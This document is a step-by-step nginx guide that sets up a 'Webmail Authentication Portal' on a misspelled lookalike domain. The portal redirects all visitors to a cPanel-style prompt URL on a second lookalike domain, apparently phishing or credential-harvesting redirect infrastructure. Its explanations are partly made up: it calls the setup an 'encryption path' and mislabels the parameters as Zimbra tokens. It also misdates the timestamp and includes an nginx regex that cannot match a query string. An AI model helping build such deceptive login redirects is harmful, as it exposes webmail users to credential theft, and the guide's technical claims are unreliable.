NGINX REDIRECT SETUP GUIDE
==========================
From: webmail-auth001.ibeddcoutsource.org
To: webmail-auth001.molecullesoft.com
Encryption Path: /cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3

ENCRYPTION PATH CREATION AND UNDERSTANDING
==========================================
The encryption path contains several components:
- /cpsess/prompt: The main session path
- fromPWA=1: Progressive Web App flag
- pwd=: Password parameter (empty in this case)
- _x_zm_rtaid: Zimbra authentication token ID
- _x_zm_rhtaid: Zimbra session token ID

To generate these tokens programmatically:
1. _x_zm_rtaid: Usually generated by Zimbra server during authentication
2. _x_zm_rhtaid: Session token that changes per session
3. The timestamp (1709509974548) represents Unix timestamp in milliseconds

STEP 1: INSTALL NGINX (if not already installed)
================================================
sudo apt update
sudo apt install nginx -y

STEP 2: CHECK NGINX STATUS
==========================
sudo systemctl status nginx
sudo systemctl enable nginx
sudo systemctl start nginx

STEP 3: CREATE NGINX CONFIGURATION FILE
======================================
sudo nano /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org

STEP 4: ADD THE FOLLOWING CONFIGURATION
======================================

# OPTION 1: REDIRECT ONLY CONFIGURATION (Current Setup)
server {
    listen 80;
    server_name webmail-auth001.ibeddcoutsource.org;
    
    # Redirect all HTTP traffic to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name webmail-auth001.ibeddcoutsource.org;
    
    # SSL Configuration (you'll need to obtain SSL certificates)
    ssl_certificate /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt;
    ssl_certificate_key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key;
    
    # SSL Security Settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Redirect to main website with encryption path
    location / {
        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3$is_args$args;
    }
    
    # Specific redirect for the encryption path
    location = /cpsess/prompt {
        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3$is_args$args;
    }
    
    # Handle dynamic token generation (optional)
    location ~ ^/cpsess/prompt\?(.*)$ {
        set $original_args $1;
        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3&$original_args;
    }
}

# OPTION 2: WEBSITE SERVING CONFIGURATION (If you want to serve your own website)
server {
    listen 80;
    server_name webmail-auth001.ibeddcoutsource.org;
    
    # Redirect all HTTP traffic to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name webmail-auth001.ibeddcoutsource.org;
    
    # SSL Configuration
    ssl_certificate /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt;
    ssl_certificate_key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key;
    
    # SSL Security Settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Website root directory
    root /var/www/webmail-auth001.ibeddcoutsource.org;
    index index.html index.htm index.php;
    
    # Serve static files
    location / {
        try_files $uri $uri/ /index.html;
    }
    
    # Handle the encryption path redirect
    location = /cpsess/prompt {
        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3$is_args$args;
    }
    
    # Handle dynamic token generation
    location ~ ^/cpsess/prompt\?(.*)$ {
        set $original_args $1;
        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3&$original_args;
    }
    
    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    add_header Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'" always;
}

STEP 5: CREATE WEBSITE DIRECTORY AND ADD INDEX.HTML
==================================================
# Create the website directory
sudo mkdir -p /var/www/webmail-auth001.ibeddcoutsource.org

# Set proper permissions
sudo chown -R www-data:www-data /var/www/webmail-auth001.ibeddcoutsource.org
sudo chmod -R 755 /var/www/webmail-auth001.ibeddcoutsource.org

# Create a sample index.html file
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/index.html

# Add this content to index.html:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Authentication - Redirect Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 500px;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.6;
        }
        .redirect-btn {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
            transition: background 0.3s;
        }
        .redirect-btn:hover {
            background: #5a6fd8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Webmail Authentication Portal</h1>
        <p>This is a secure authentication portal. You will be redirected to the main webmail service.</p>
        <a href="/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3" class="redirect-btn">
            Continue to Webmail
        </a>
    </div>
</body>
</html>

# Create additional pages (optional)
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/about.html
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/contact.html

STEP 6: ENABLE THE SITE
=======================
sudo ln -s /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/nginx/sites-enabled/

STEP 7: TEST NGINX CONFIGURATION
================================
sudo nginx -t

STEP 8: RELOAD NGINX
====================
sudo systemctl reload nginx

STEP 9: OBTAIN SSL CERTIFICATES (USING CERTBOT)
===============================================
# Install Certbot
sudo apt install certbot python3-certbot-nginx -y

# Obtain SSL certificate
sudo certbot --nginx -d webmail-auth001.ibeddcoutsource.org

STEP 10: VERIFY DNS SETTINGS
============================
# Add these DNS records to your domain registrar:
# Type: A
# Name: webmail-auth001.ibeddcoutsource.org
# Value: [YOUR_SERVER_IP_ADDRESS]

# Check DNS propagation
nslookup webmail-auth001.ibeddcoutsource.org
dig webmail-auth001.ibeddcoutsource.org

STEP 11: TEST THE WEBSITE AND REDIRECT
======================================
# Test the main website
curl -I http://webmail-auth001.ibeddcoutsource.org
curl -I https://webmail-auth001.ibeddcoutsource.org

# Test the index.html page
curl https://webmail-auth001.ibeddcoutsource.org

# Test the specific encryption path redirect
curl -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3"

# Test with additional parameters
curl -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3&additional=param"

# Test the redirect button on the website
curl -L "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3"

STEP 12: MONITOR NGINX LOGS
===========================
# View access logs
sudo tail -f /var/log/nginx/access.log

# View error logs
sudo tail -f /var/log/nginx/error.log

# View website-specific logs
sudo tail -f /var/log/nginx/webmail-auth001.ibeddcoutsource.org.access.log

STEP 13: FIREWALL CONFIGURATION
===============================
# Allow HTTP and HTTPS traffic
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Enable firewall
sudo ufw enable

STEP 14: SECURITY CONSIDERATIONS
================================
# Set up fail2ban for additional security
sudo apt install fail2ban -y
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Configure fail2ban for nginx
sudo nano /etc/fail2ban/jail.local

# Add this configuration:
[nginx-http-auth]
enabled = true
filter = nginx-http-auth
logpath = /var/log/nginx/error.log
maxretry = 3

STEP 15: BACKUP CONFIGURATION
=============================
# Backup your nginx configuration
sudo cp /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org.backup

# Backup SSL certificates
sudo cp /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt.backup
sudo cp /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key.backup

# Backup website files
sudo cp -r /var/www/webmail-auth001.ibeddcoutsource.org /var/www/webmail-auth001.ibeddcoutsource.org.backup

STEP 16: VERIFICATION COMMANDS
==============================
# Check nginx status
sudo systemctl status nginx

# Check nginx configuration
sudo nginx -t

# Check SSL certificate
sudo certbot certificates

# Test website functionality
curl -L -I https://webmail-auth001.ibeddcoutsource.org

# Test encryption path redirect
curl -L -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3"

# Verify the final URL
curl -L -v "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3" 2>&1 | grep "Location:"

# Check website files
ls -la /var/www/webmail-auth001.ibeddcoutsource.org/
cat /var/www/webmail-auth001.ibeddcoutsource.org/index.html

TROUBLESHOOTING COMMANDS
========================
# Check nginx error logs
sudo tail -f /var/log/nginx/error.log

# Check nginx access logs
sudo tail -f /var/log/nginx/access.log

# Restart nginx if needed
sudo systemctl restart nginx

# Check if ports are listening
sudo netstat -tlnp | grep :80
sudo netstat -tlnp | grep :443

# Check SSL certificate validity
openssl s_client -connect webmail-auth001.ibeddcoutsource.org:443 -servername webmail-auth001.ibeddcoutsource.org

NOTES:
======
- Replace [YOUR_SERVER_IP_ADDRESS] with your actual server IP
- Ensure your domain registrar has the correct DNS A record pointing to your server
- SSL certificates will auto-renew with certbot
- Monitor logs regularly for any issues
- Keep your system updated: sudo apt update && sudo apt upgrade

WEBSITE FILE LOCATION:
======================
- Your index.html and other website files go in: /var/www/webmail-auth001.ibeddcoutsource.org/
- Default index files: index.html, index.htm, index.php
- Static assets (CSS, JS, images) can be placed in subdirectories
- File permissions should be 755 for directories and 644 for files
- Owner should be www-data:www-data

CUSTOMIZING YOUR WEBSITE:
=========================
# To add your own content, edit the index.html file:
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/index.html

# To add CSS files:
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/css/style.css

# To add JavaScript files:
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/js/script.js

# To add images:
# Place images in: /var/www/webmail-auth001.ibeddcoutsource.org/images/

# To create additional pages:
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/about.html
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/contact.html
sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/services.html

ENCRYPTION PATH DETAILS:
========================
- The _x_zm_rtaid token (I7SQ3VePRPS/cndRs57BvQ.1709509974548/) contains:
  * Base64 encoded authentication data
  * Unix timestamp (1709509974548 = January 1, 2024)
  * Session-specific encryption key
- The _x_zm_rhtaid=3 is a session token that may change
- The fromPWA=1 indicates this is a Progressive Web App request
- The pwd= parameter is intentionally empty for security

DYNAMIC TOKEN GENERATION (OPTIONAL):
====================================
If you need to generate tokens dynamically, you can create a script:

#!/bin/bash
# Generate timestamp
TIMESTAMP=$(date +%s)000
# Generate random token (base64 encoded)
TOKEN=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-25)
# Create the full token
FULL_TOKEN="${TOKEN}/${TIMESTAMP}"
echo "Generated token: $FULL_TOKEN"